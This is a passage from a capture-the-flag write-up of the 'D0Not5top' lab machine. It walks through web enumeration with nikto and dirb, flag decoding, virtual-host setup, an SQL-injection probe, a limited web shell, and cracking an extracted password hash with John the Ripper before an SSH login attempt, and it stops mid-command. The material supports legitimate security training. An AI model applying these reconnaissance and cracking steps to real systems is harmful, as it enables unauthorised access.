+ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 26 entries which should be manually viewed.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ OSVDB-3092: /archive/: This might be interesting...
+ OSVDB-3092: /support/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-admin/: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7563 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 28 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-06-08 13:37:05 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wordpress website? Unfortunately not, it was false alarm, as they were only blank pages. Let's hope that &lt;b&gt;robots.txt&lt;/b&gt; will tell us something more about this site.   &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;User-agent: *
Disallow: /games
Disallow: /dropbox
Disallow: /contact
Disallow: /blog/wp-login.php
Disallow: /blog/wp-admin
Disallow: /search
Disallow: /support/search.php
Disallow: /extend/plugins/search.php
Disallow: /plugins/search.php
Disallow: /extend/themes/search.php
Disallow: /themes/search.php
Disallow: /support/rss
Disallow: /archive/
Disallow: /wp-admin/
Disallow: /wp-content/
Disallow: /wp-includes/
Disallow: /comment-page-
Disallow: /trackback/
Disallow: /xmlrpc.php
Disallow: /blackhole/
Disallow: /mint/
Disallow: /feed/
Allow: /tag/mint/
Allow: /tag/feed/
Allow: /wp-content/images/
Allow: /wp-content/online/

# terminal knows where to go.
User-agent: GameTerminal
Disallow:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Bad luck, after manually checking each entry all of them were, once again, blank pages. Even &lt;b&gt;phpmyadmin&lt;/b&gt; website, that I came around, didn't help me.  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/phpmyadmin.png&quot; alt=&quot;phpmyadmin&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Desperatly looking for something more I decided to run a &lt;b&gt;dirb&lt;/b&gt; scan, in hope to find something.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# dirb http://10.0.2.8

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Thu Jun  8 13:43:39 2017
URL_BASE: http://10.0.2.8/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 4612

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.0.2.8/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/archive/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/blog/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/contact/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/control/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/feed/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/games/
+ http://10.0.2.8/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:211&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/manual/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/mint/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/phpmyadmin/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/plugins/
+ http://10.0.2.8/robots.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:695&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/search/
+ http://10.0.2.8/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/support/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/tag/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/themes/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/trackback/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/wp-admin/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/wp-content/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/wp-includes/
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://10.0.2.8/xmlrpc.php/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1&gt;Control&lt;/h1&gt;

&lt;p&gt;That's only a part of the entry, but I've found that there are more results such as &lt;b&gt;control&lt;/b&gt; or &lt;b&gt;server-status&lt;/b&gt; page. Let's look at them, firstly the control page. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/control.png&quot; alt=&quot;control&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;None of the functions seemed to work so I decided to look at the source code. And here it is, the first flag! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrapper&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- FL46_1:urh8fu3i039rfoy254sx2xtrs5wc6767w --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;nav&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navbar navbar-inverse navbar-fixed-top&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navigation&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navbar-header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;navbar-brand&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Startmin&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, I think we're on the right track. Another clue was hidden, scrooling downwards.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-lg-12&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;page-header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;DNS Control Panel&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fluid-ratio-resize&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- M3gusta said he hasn't had time to get this w0rKING.
  Don't think he's quite in the 20n3 these days since his MadBro made that 7r4n5f3r, Just Couldnt H@cxk Da D0Not5topMe.ctf --!&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As I've tried to look in every directory possible, I've found that in the &lt;b&gt;/control/js&lt;/b&gt; folder was the file called &lt;b&gt;README.MadBro&lt;/b&gt;. What's that?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;  ###########################################################
  # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
  # M4K3 5UR3 2 S3TUP Y0UR /3TC/H05T5 N3XT T1M3 L0053R...   #
  # 1T'5 D0Not5topMe.ctf !!!!                               #
  # 1M 00T4 H33R..                                          #
  # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
  ###########################################################

                  FL101110_10:111101011101
                  1r101010q10svdfsxk1001i1
                  11ry100f10srtr1100010h10                &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Flag in binary? Let's decode it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FL46_2:39331r42q2svdfsxk9i13ry4f2srtr98h2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let's come back to the clue. We have to setup &lt;b&gt;/etc/hosts&lt;/b&gt;? In the left column of the file is IP address of our machine, and in the right the domain name.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;127.0.0.1       localhost
127.0.1.1       kali
10.0.2.8       D0Not5topMe.ctf


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we are ready to reset the network interface, and access the site. &lt;/p&gt;

&lt;h1&gt;D0Not5topMe.ctf&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/forum.png&quot; alt=&quot;forum&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;PhpBB&lt;/b&gt; forum. The message in the homepage seems to be &lt;b&gt;pig latin&lt;/b&gt;. After simple translation, we got the message. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;emay ayingplay uchmay amesgay ownay egistrarioray arnay edsay emay emailway ayay egustomay otay indfay away eomay ideyhohay
me playing much games now registrario rna sed me wemail a megusto to find wa meo hideyho&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Okay, so we have to register. I tried doing it with different accounts, playing with options ,but none of them seemed to lead me to the solution. After a while, I found that after not agreeing with terms, website will send a &lt;b&gt;POST&lt;/b&gt; request, with some fancy paramteres. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/donotagree.png&quot; alt=&quot;donotagree&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;See this string &lt;b&gt;FLaR6yF1nD3rZ_html&lt;/b&gt;? Let's jump to that. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-brainfuck&quot; data-lang=&quot;brainfuck&quot;&gt;+++++ +++[- &amp;gt;++++ ++++&amp;lt; ]&amp;gt;+++ +++.+ +++++ .&amp;lt;+++ +[-&amp;gt;- ---&amp;lt;] &amp;gt;---- ----.
++.&amp;lt;+ +++++ [-&amp;gt;++ ++++&amp;lt; ]&amp;gt;+++ ++.&amp;lt;+ +++++ [-&amp;gt;-- ----&amp;lt; ]&amp;gt;--- ----. +++++
+.&amp;lt;++ +++++ [-&amp;gt;++ +++++ &amp;lt;]&amp;gt;++ +.&amp;lt;++ +++++ [-&amp;gt;-- ----- &amp;lt;]&amp;gt;-- ----- -----
-.++. &amp;lt;++++ ++[-&amp;gt; +++++ +&amp;lt;]&amp;gt;+ +++++ +++++ +.&amp;lt;++ ++[-&amp;gt; ++++&amp;lt; ]&amp;gt;+++ +.&amp;lt;++
+++++ +[-&amp;gt;- ----- --&amp;lt;]&amp;gt; ----- .&amp;lt;+++ +++++ [-&amp;gt;++ +++++ +&amp;lt;]&amp;gt;+ .++++ ++.&amp;lt;+
+++++ ++[-&amp;gt; ----- ---&amp;lt;] &amp;gt;---. &amp;lt;++++ +++[- &amp;gt;++++ +++&amp;lt;] &amp;gt;++++ +++++ ++++.
&amp;lt;+++[ -&amp;gt;--- &amp;lt;]&amp;gt;-- ---.&amp;lt; +++++ ++[-&amp;gt; ----- --&amp;lt;]&amp;gt; .+.+. ----- -.+++ +++++
+.-.- ---.&amp;lt; +++++ ++[-&amp;gt; +++++ ++&amp;lt;]&amp;gt; ..-.- .++++ +.++. +++++ ++++. &amp;lt;++++
+++[- &amp;gt;---- ---&amp;lt;] &amp;gt;---- ----- --.-- ---.&amp;lt; +++++ ++[-&amp;gt; +++++ ++&amp;lt;]&amp;gt; +++++
.&amp;lt;+++ [-&amp;gt;++ +&amp;lt;]&amp;gt;+ +.++. --.++ .&amp;lt;+++ ++++[ -&amp;gt;--- ----&amp;lt; ]&amp;gt;--- ----- ---.&amp;lt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Looks like &lt;b&gt;brainfuck&lt;/b&gt;. After compiling it, we got another flag! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FL46_4:n02bv1rx5se4560984eedchjs72hsusu9&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Still, it didn't lead me anywhere near the end. At this time, I decided to take a look at possible SQL injections where I've found something interesting. Changing the URL, resulted in showing an error message. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://d0not5topme.ctf/ucp.php?sid=f22e8d906dbe2b481bb7f30522b7e7a0&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;i=hithere&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Together with this message was the e-mail address. Will it be another domain to enter in &lt;b&gt;/etc/hosts&lt;/b&gt;? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/error.png&quot; alt=&quot;error&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let's try that. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;127.0.0.1       localhost
127.0.1.1       kali
10.0.2.8        D0Not5topMe.ctf
10.0.2.8        G4M35.ctf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now we can direct our browser to that site. &lt;/p&gt;

&lt;h1&gt;G4M35.ctf&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/game.png&quot; alt=&quot;game&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It's a game and it's pretty good one. Or maybe it's my lack of games, who really knows... Anyway, it was fun little break, but after losing I got another hint. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/death.png&quot; alt=&quot;death&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another directory and another game, awesome!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/game-2.png&quot; alt=&quot;game-2&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After playing for a while, I noticed a strange texture in the background. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/texture.png&quot; alt=&quot;texture&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Typing it down got us another flag! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;\106\114\64\66\137\65\72\60\71\153\70\67\150\66\147\64\145\62\65\147\150\64\64\167\141\61\162\171\142\171\146\151\70\71\70\150\156\143\144\165
FL46_5:09K87H6G4E25GH44WA1RYBYFI898HNCDU&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Two more to go! After playing a bit more, and finishing it, I got another domain to add -  this time &lt;b&gt;t3rm1n4l.ctf&lt;/b&gt;. We can once again add this to &lt;b&gt;/etc/hosts&lt;/b&gt;. &lt;/p&gt;

&lt;h1&gt;T3rm1n4l.ctf&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/terminal.png&quot; alt=&quot;terminal&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It's a terminal, but what's the password? Luckily, after some tries, I typed &lt;b&gt;t3rm1n4l.ctf&lt;/b&gt; and it works! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/usr/share/nginx/html
dir
t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
dir
ERROR: Megusto ere no no!
id
t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
t3rm1n4l.ctf Passwordo Requireo:
t3rm1n4l.ctf
AUTHENTICO!
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;: BBBBBBBBBBB: Is a directory
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;: CCCCCCCCCCC: Is a directory
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;: M36u574.ctf: Is a directory
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;: XXXXXXXXXXX: Is a directory
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;: YYYYYYYYYYY: Is a directory
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;: ZZZZZZZZZZZ: Is a directory&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And another long journey through typing different commands. I've found that &lt;b&gt;grep&lt;/b&gt; command works, and now we have another domain to collect. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;127.0.0.1       localhost
127.0.1.1       kali
10.0.2.8        D0Not5topMe.ctf
10.0.2.8        G4M35.ctf
10.0.2.8        t3rm1n4l.ctf
10.0.2.8        M36u574.ctf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1&gt;M36u574.ctf&lt;/h1&gt;

&lt;p&gt;This page was... It was a slideshow of different megusta memes. As nothing was in the source code, I decided to take a look at the images - maybe they are hiding something. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/kingmegusta.jpg&quot; alt=&quot;kingmegusta&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yeah, this image, I knew it was hiding something! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Documents# exiftool kingmegusta.jpg
MeGustaKing:&lt;span class=&quot;nv&quot;&gt;$6$e1&lt;/span&gt;.2NcUo&lt;span class=&quot;nv&quot;&gt;$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRNPxQnydsLzQGvYOU84B2nY&lt;/span&gt;/O40pZ30&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Username and password pair, now we only have to crack it. &lt;b&gt;JohnTheRipper&lt;/b&gt; should be ablo to do it without any problems. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Documents# john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;:/usr/share/wordlists/rockyou.txt pass
Created directory: /root/.john
Warning: detected &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sha512crypt&quot;&lt;/span&gt;, but the string is also recognized as &lt;span class=&quot;s2&quot;&gt;&quot;crypt&quot;&lt;/span&gt;
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--format=crypt&quot;&lt;/span&gt; option to force loading these as that &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;instead
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$6$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA512 128/128 AVX 2x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:38 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2017-06-09 06:51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.02625g/s 574.6p/s 574.6c/s 574.6C/s 101207..shayneward
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1&gt;SSH&lt;/h1&gt;

&lt;p&gt;This is the password? Really? Moving on, we should be able to login to &lt;b&gt;ssh&lt;/b&gt; using these credentials. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Documents# ssh MeGustaKing@10.0.2.8
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.0.2.8 (10.0.2.8)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:mAxp6psDamyOxr81/mYUZPkIk2s+EDdyz1+RkRFLSUM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '&lt;/span&gt;10.0.2.8&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
MeGustaKing@10.0.2.8'&lt;/span&gt;s password:
ERROR!
TRACE: sshPr0xy.py line:550 &amp;lt;CODE&amp;gt;U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&amp;lt;/CODE&amp;gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
Welcome to rush shell
Lets you update your FunNotes and more!

Uh0h.. u n0 burtieo
h35 da 54wltyD4w6 y0u...
Gw04w4y :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
Local configuration error occurred.
Contact the systems administrator &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;further assistance.
Connection to 10.0.2.8 closed.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately, we didn't have a chance to type commands but we got this base64 encrypted string. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Documents# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5
